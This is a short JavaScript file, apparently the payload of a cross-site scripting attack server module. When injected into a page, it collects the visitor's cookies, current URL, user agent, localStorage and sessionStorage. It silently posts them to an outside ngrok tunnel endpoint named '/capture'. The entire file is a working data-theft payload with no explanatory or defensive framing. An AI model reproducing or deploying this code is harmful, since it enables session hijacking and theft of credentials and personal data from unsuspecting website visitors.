// modules/xss_server/public/payload.js
(function(){
    var d = {
        c: document.cookie,
        u: window.location.href,
        a: navigator.userAgent,
        l: JSON.stringify(localStorage),
        s: JSON.stringify(sessionStorage)
    };
    fetch('https://42a4-189-174-213-167.ngrok-free.app/capture', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(d)
    }).catch(e => {});
})();
